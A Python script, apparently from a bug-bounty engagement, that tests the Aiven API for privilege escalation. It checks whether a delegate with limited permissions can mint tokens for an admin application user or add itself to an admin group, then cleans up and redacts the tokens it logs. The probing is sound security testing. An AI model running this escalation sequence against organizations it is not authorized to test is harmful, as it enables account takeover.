#!/usr/bin/env python3
"""Aiven run 7d: owner-minted vs delegate-minted token battery."""
import json
import os
import re
import sys
import urllib.request
import urllib.error

BASE = "https://api.aiven.io/v1"
T1 = os.environ.get("AIVEN_TOKEN_1", "")
T2 = os.environ.get("AIVEN_TOKEN_2", "")
if not T1 or not T2:
    print("tokens missing", flush=True)
    sys.exit(2)

ORG = "org5eea5b7d496"
A1 = "a5eea5b45dff"
P1 = "bugcrowdninja-b1ee"
os.makedirs("outputs", exist_ok=True)
CALLS = []


def req(method, path, token, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(
        BASE + path, data=data, method=method,
        headers={"Authorization": f"aivenv1 {token}",
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"ERROR {e}"[:200]


def call(who, method, path, token, body=None, keep=400):
    status, resp = req(method, path, token, body)
    safe = re.sub(r'"full_token"\s*:\s*"[^"]+"', '"full_token":"<redacted>"',
                  resp[:keep])
    CALLS.append({"who": who, "method": method, "path": path,
                  "status": status, "len": len(resp), "body": safe})
    print(f"{who} {method} {path} -> {status}", flush=True)
    return status, resp


def field(text, *names):
    for n in names:
        m = re.search(rf'"{n}"\s*:\s*"([^"]+)"', text or "")
        if m:
            return m.group(1)
    return None


def grant(pid, ptype, perms):
    return call("T1", "PUT",
                f"/organization/{ORG}/permissions/organization/{ORG}",
                T1, {"permissions": [{"principal_id": pid,
                                      "principal_type": ptype,
                                      "permissions": perms}]})


def battery(who, tok, priv):
    call(who, "GET", f"/organization/{ORG}/user", tok)
    call(who, "GET", f"/organization/{ORG}/user/{priv}/permissions", tok)
    call(who, "POST", f"/organization/{ORG}/application-users", tok,
         {"name": f"moka-batt-{who.lower()}"})
    call(who, "GET", f"/account/{A1}/events", tok)
    call(who, "GET", f"/project/{P1}/service", tok)
    call(who, "GET", f"/organization/{ORG}/projects", tok)
    call(who, "POST", f"/organization/{ORG}/user-groups", tok,
         {"user_group_name": f"moka-batt-{who.lower()}",
          "description": "battery"})
    call(who, "GET", f"/project/{P1}", tok)


def main():
    s, b = call("T1", "GET", f"/organization/{ORG}/user", T1, keep=4000)
    t2_uid = None
    try:
        for u in json.loads(b).get("users", []):
            if "account2" in ((u.get("user_info") or {}).get("user_email") or ""):
                t2_uid = u.get("user_id")
    except Exception:
        pass
    print(f"t2={t2_uid}", flush=True)

    s, b = call("T1", "POST", f"/organization/{ORG}/application-users",
                T1, {"name": "moka-priv3"})
    priv = field(b, "user_id")
    grant(priv, "user", ["role:organization:admin"])

    s, b = call("T1", "POST",
                f"/organization/{ORG}/application-users/{priv}/access-tokens",
                T1, {"description": "owner-mint"})
    tm_owner = field(b, "full_token")
    print(f"owner-minted captured: {bool(tm_owner)}", flush=True)

    grant(t2_uid, "user", ["organization:app_users:write"])
    s, b = call("T2", "POST",
                f"/organization/{ORG}/application-users/{priv}/access-tokens",
                T2, {"description": "delegate-mint"})
    tm_del = field(b, "full_token")
    print(f"delegate-minted captured: {bool(tm_del)}", flush=True)

    if tm_owner:
        print("--- battery OWNER-minted ---", flush=True)
        battery("TMO", tm_owner, priv)
    if tm_del:
        print("--- battery DELEGATE-minted ---", flush=True)
        battery("TMD", tm_del, priv)

    s, b = call("T1", "POST", f"/organization/{ORG}/user-groups",
                T1, {"user_group_name": "moka-gpriv3", "description": "probe"})
    gpriv = field(b, "user_group_id")
    if gpriv:
        grant(gpriv, "user_group", ["role:organization:admin"])
    grant(t2_uid, "user", ["organization:groups:write"])
    if gpriv:
        call("T2", "PATCH", f"/organization/{ORG}/user-groups/{gpriv}/members",
             T2, {"member_ids": [t2_uid], "operation": "add_members"})
        print("--- T2 actions after joining admin group ---", flush=True)
        call("T2", "POST", f"/organization/{ORG}/application-users", T2,
             {"name": "moka-group-esc"})
        call("T2", "GET", f"/organization/{ORG}/user/{priv}/permissions", T2)
        call("T2", "GET", f"/project/{P1}/service", T2)

    if gpriv:
        call("T1", "PATCH", f"/organization/{ORG}/user-groups/{gpriv}/members",
             T1, {"member_ids": [t2_uid], "operation": "remove_members"})
        call("T1", "DELETE", f"/organization/{ORG}/user-groups/{gpriv}", T1)
    s, b = call("T1", "GET", f"/organization/{ORG}/user", T1, keep=6000)
    try:
        for u in json.loads(b).get("users", []):
            nm = (u.get("user_info") or {}).get("real_name") or ""
            if nm.startswith("moka-"):
                call("T1", "DELETE",
                     f"/organization/{ORG}/application-users/{u.get('user_id')}",
                     T1)
    except Exception as e:
        print(f"cleanup parse failed: {e}", flush=True)
    s, b = call("T1", "GET", f"/organization/{ORG}/user-groups", T1, keep=4000)
    try:
        for g in json.loads(b).get("user_groups", []):
            if (g.get("user_group_name") or "").startswith("moka-"):
                call("T1", "DELETE",
                     f"/organization/{ORG}/user-groups/{g.get('user_group_id')}",
                     T1)
    except Exception as e:
        print(f"group cleanup parse failed: {e}", flush=True)
    if priv:
        call("T1", "DELETE", f"/organization/{ORG}/application-users/{priv}",
             T1)
    grant(t2_uid, "user", [])
    with open("outputs/aiven_delegation4.json", "w") as f:
        json.dump({"calls": CALLS}, f, indent=1)
    print(f"DONE calls={len(CALLS)}", flush=True)


if __name__ == "__main__":
    main()
